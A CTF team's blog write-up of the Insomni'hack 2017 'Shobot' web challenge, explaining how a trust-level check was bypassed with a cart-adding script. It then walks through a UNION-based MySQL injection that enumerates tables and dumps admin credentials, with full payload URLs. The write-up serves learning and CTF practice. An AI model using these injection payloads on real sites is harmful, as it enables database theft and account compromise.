<!doctype html><html lang=en-us>
<head>
<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<title> Insomni'hack teaser: Shobot (web 200) | ChaGu CTF</title>
<link rel=canonical href=https://chagu.org/posts/insomnihack_teaser_2017_shobot/>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="all,follow">
<meta name=googlebot content="index,follow,snippet,archive">
<meta property="og:title" content="Insomni'hack teaser: Shobot (web 200)">
<meta property="og:description" content="You were presented with an online store that sold robots. We didn&rsquo;t manage to solve this challenge in time.
What we did correct The website had a function running that calculates a user&rsquo;s trust level based on how many products he/she buys. If you tried any SQL injection in the URL parameters with low trust level, the server would detect it and lower your trust level. Once you reached the maximum trust level, you could successfully execute SQL injections.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://chagu.org/posts/insomnihack_teaser_2017_shobot/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2017-01-22T11:22:32+02:00">
<meta property="article:modified_time" content="2017-01-22T11:22:32+02:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Insomni'hack teaser: Shobot (web 200)">
<meta name=twitter:description content="You were presented with an online store that sold robots. We didn&rsquo;t manage to solve this challenge in time.
What we did correct The website had a function running that calculates a user&rsquo;s trust level based on how many products he/she buys. If you tried any SQL injection in the URL parameters with low trust level, the server would detect it and lower your trust level. Once you reached the maximum trust level, you could successfully execute SQL injections.">
<link rel=stylesheet href=https://chagu.org/css/styles.877f0d187d777677210859d158f899b22bc9251cff14ab3f2aeaaf7e09c4b15a691db4d151e8f0be980792a40c8d658ffb0a5ed37ea53eccec5125ee4e6055b7.css integrity="sha512-h38NGH13dnchCFnRWPiZsivJJRz/FKs/KuqvfgnEsVppHbTRUejwvpgHkqQMjWWP+wpe036lPszsUSXuTmBVtw=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
<link rel=icon type=image/png href=https://chagu.org/images/favicon.ico>
</head>
<body class="max-width mx-auto px3 ltr">
<div class="content index py4">
<div id=header-post>
<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu>
<span id=nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</span>
<br>
<span id=actions>
<ul>
<li>
<a class=icon href=https://chagu.org/posts/insomnihack_teaser_2017_smarttomcat/ aria-label=Previous>
<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=https://chagu.org/posts/insomnihack_teaser_2017_cryptoquiz/ aria-label=Next>
<i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle()" onmouseout="$('#i-next').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# aria-label=Share>
<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
</a>
</li>
</ul>
<span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span>
</span>
<br>
<div id=share style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f" aria-label=Facebook>
<i class="fab fa-facebook" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&text=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=Twitter>
<i class="fab fa-twitter" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&title=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=Linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&is_video=false&description=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=Pinterest>
<i class="fab fa-pinterest" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29&body=Check out this article: https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f" aria-label=Email>
<i class="fas fa-envelope" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&title=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=Pocket>
<i class="fab fa-get-pocket" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&title=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=reddit>
<i class="fab fa-reddit" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&name=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29&description=You%20were%20presented%20with%20an%20online%20store%20that%20sold%20robots.%20We%20didn%26rsquo%3bt%20manage%20to%20solve%20this%20challenge%20in%20time.%0aWhat%20we%20did%20correct%20The%20website%20had%20a%20function%20running%20that%20calculates%20a%20user%26rsquo%3bs%20trust%20level%20based%20on%20how%20many%20products%20he%2fshe%20buys.%20If%20you%20tried%20any%20SQL%20injection%20in%20the%20URL%20parameters%20with%20low%20trust%20level%2c%20the%20server%20would%20detect%20it%20and%20lower%20your%20trust%20level.%20Once%20you%20reached%20the%20maximum%20trust%20level%2c%20you%20could%20successfully%20execute%20SQL%20injections." aria-label=Tumblr>
<i class="fab fa-tumblr" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&t=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label="Hacker News">
<i class="fab fa-hacker-news" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=toc>
<nav id=TableOfContents>
<ul>
<li>
<ul>
<li><a href=#what-we-did-correct>What we did correct</a></li>
<li><a href=#what-we-missed>What we missed</a></li>
<li><a href=#what-we-did-wrong>What we did wrong</a></li>
</ul>
</li>
<li><a href=#what-have-we-learned>What have we learned?</a></li>
</ul>
</nav>
</div>
</span>
</div>
<article class=post itemscope itemtype=http://schema.org/BlogPosting>
<header>
<h1 class=posttitle itemprop="name headline">
Insomni'hack teaser: Shobot (web 200)
</h1>
<div class=meta>
<div class=postdate>
<time datetime="2017-01-22 11:22:32 +0200 +0200" itemprop=datePublished>2017-01-22</time>
</div>
<div class=article-read-time>
<i class="far fa-clock"></i>
3 minute read
</div>
<div class=article-tag>
<i class="fas fa-tag"></i>
<a class=tag-link href=/tags/sql-injection rel=tag>SQL Injection</a>
</div>
</div>
</header>
<div class=content itemprop=articleBody>
<p>You were presented with an online store that sold robots. We didn&rsquo;t manage to solve this challenge in time.</p>
<h3 id=what-we-did-correct>What we did correct</h3>
<p>The website had a function running that calculates a user&rsquo;s trust level based on how many products he/she buys. If you tried any SQL injection in the URL parameters with low trust level, the server would detect it and lower your trust level. Once you reached the maximum trust level, you could successfully execute SQL injections.</p>
<h3 id=what-we-missed>What we missed</h3>
<p>We did not experiment with how far the trust level went, had we done that we would have reached 160 and our SQL injection would have gone through.</p>
<h3 id=what-we-did-wrong>What we did wrong</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests<span style=color:#f92672>,</span>time
s <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
cookie<span style=color:#f92672>=</span> dict(PHPSESSID<span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;f5hnhjd5qbiiebu9v057fe6m51&#39;</span>)
<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.5</span>)
    r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=1&amp;addToCart&#39;</span>, cookies<span style=color:#f92672>=</span>cookie)
    r <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;http://shobot.teaser.insomnihack.ch/?page=cartconfirm&#39;</span>, cookies<span style=color:#f92672>=</span>cookie)
</code></pre></div><p>Once we had the above script running, boosting the trust level to 160, we could do SQL injection in one of the parameters.
We noticed that this worked, to verify there was an SQLi:</p>
<p><strong>ERROR</strong>: <code>http://shobot.teaser.insomnihack.ch/?page=article&artid=2' and '1'='2</code></p>
<p><strong>SUCCESS</strong>: <code>http://shobot.teaser.insomnihack.ch/?page=article&artid=2' and '1'='1</code></p>
<p>So next step would be to figure out how many columns there are by running the classic:</p>
<p><code>2' order by 1 --</code></p>
<p>But that didn&rsquo;t work, because the comment had to be url_encoded. The double dash comment (&ndash;) was also incorrect. In order for the query to work you would have to url_encode the # for comment.
What we should have done
The working query looks like this:</p>
<p><code>http://shobot.teaser.insomnihack.ch/?page=article&artid=2' order by 5 %23</code></p>
<p>By doing <code>2' order by N %23</code> you can find the number of columns in the query, this is necessary because the UNION operator can only be used if both queries have the same structure. Therefore the attacker needs to create a SELECT statement similar to the original query.</p>
<p>If you keep increasing <code>N</code> until you reach 6, the page will disappear, meaning the column count is 5. Now we know there are 5 columns and can continue like this (you do this directly to figure out the number of columns):</p>
<p><code>http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,2,3,4,5 %23</code></p>
<p>Notice the <code>-2</code>, in order for this to work you have to select a non existent id, putting a minus (-) sign usually get the job done. The numbers that shows on the page are the columns that you can interact with. The numbers 2, 3 and 5 showed, so we can do this:</p>
<p><code>http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,@@version,3,4,5 %23</code></p>
<p>Should show the mysql version. Now lets retrieve the tables so we know that we are working with:</p>
<p><code>http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,group_concat(table_name),3,4,5 FROM information_schema.tables where table_schema=database() %23</code></p>
<p>We are selecting from <code>information_schema.tables</code> which contains information about all the tables. Then we make sure the <code>table_schema</code> is set to the current database, meaning want tables for the current database. We have two tables, the result is: <code>article, shbt_user</code>. Now we can retrieve the column names from the shbt_user table:</p>
<p><code>http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,group_concat(column_name),3,4,5 FROM information_schema.columns where table_schema=database() %23</code></p>
<p>Result: <code>id,name,description,img_link,price,shbt_userid,shbt_username,shbt_userpassword</code>. Let&rsquo;s get the values for <code>shbt_username, shbt_userpassword</code> by running the following query:</p>
<p><code>http://shobot.teaser.insomnihack.ch/?page=article&artid=-2' union select 1,concat(shbt_username,0x3a,shbt_userpassword),3,4,5 FROM shbt_user %23</code></p>
<p>The result is: <code>sh0b0t4dm1n:N0T0R0B0TS$L4V3Ry</code>. Now we can login to the admin site and collect the <strong>flag</strong>: <code>INS{##r0b0tss!4v3ry1s!4m3}</code></p>
<h2 id=what-have-we-learned>What have we learned?</h2>
<ul>
<li>Always try all the possible comment signs for mysql and always try to encode.</li>
<li>Always experiment with values.</li>
</ul>
</div>
</article>
<div id=footer-post-container>
<div id=footer-post>
<div id=nav-footer style=display:none>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</div>
<div id=toc-footer style=display:none>
<nav id=TableOfContents>
<ul>
<li>
<ul>
<li><a href=#what-we-did-correct>What we did correct</a></li>
<li><a href=#what-we-missed>What we missed</a></li>
<li><a href=#what-we-did-wrong>What we did wrong</a></li>
</ul>
</li>
<li><a href=#what-have-we-learned>What have we learned?</a></li>
</ul>
</nav>
</div>
<div id=share-footer style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f" aria-label=Facebook>
<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&text=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=Twitter>
<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&title=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=Linkedin>
<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&is_video=false&description=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=Pinterest>
<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29&body=Check out this article: https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f" aria-label=Email>
<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&title=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=Pocket>
<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&title=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label=reddit>
<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&name=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29&description=You%20were%20presented%20with%20an%20online%20store%20that%20sold%20robots.%20We%20didn%26rsquo%3bt%20manage%20to%20solve%20this%20challenge%20in%20time.%0aWhat%20we%20did%20correct%20The%20website%20had%20a%20function%20running%20that%20calculates%20a%20user%26rsquo%3bs%20trust%20level%20based%20on%20how%20many%20products%20he%2fshe%20buys.%20If%20you%20tried%20any%20SQL%20injection%20in%20the%20URL%20parameters%20with%20low%20trust%20level%2c%20the%20server%20would%20detect%20it%20and%20lower%20your%20trust%20level.%20Once%20you%20reached%20the%20maximum%20trust%20level%2c%20you%20could%20successfully%20execute%20SQL%20injections." aria-label=Tumblr>
<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_shobot%2f&t=Insomni%27hack%20teaser%3a%20Shobot%20%28web%20200%29" aria-label="Hacker News">
<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=actions-footer>
<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
</div>
</div>
</div>
<footer id=footer>
<div class=footer-left>
Copyright &copy; 2021 ChaGu CTF
</div>
<div class=footer-right>
<nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</nav>
</div>
</footer>
</div>
</body>
<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
<script src=/js/code-copy.js></script>
</html>